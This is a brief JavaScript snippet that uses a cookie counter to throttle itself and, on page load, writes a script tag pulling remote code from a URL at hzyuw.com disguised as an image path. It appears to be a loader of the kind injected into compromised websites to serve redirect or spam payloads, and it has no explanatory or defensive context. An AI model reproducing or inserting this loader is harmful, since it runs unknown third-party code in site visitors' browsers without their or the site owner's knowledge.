var waplun = ["https://www.hzyuw.com/img/10481","https://www.hzyuw.com/img/10481"]
var wapm=2;
var wapn=Math.floor(Math.random()*wapm);
//if (wapn <3){
/////if (/(iphone|ipad|ipod|ios)/i.test(navigator.userAgent.toLowerCase())) {
if (!getCookie('pf')){
    document.cookie = "pf=1;max-age=1000;";
}
if (Number(getCookie('pf'))<10){
    document.cookie = "pf="+(Number(getCookie('pf'))+1)+";max-age=1000;";
    document.writeln("<script src='"+waplun[wapn]+"' ></script>");
}
//    }
//}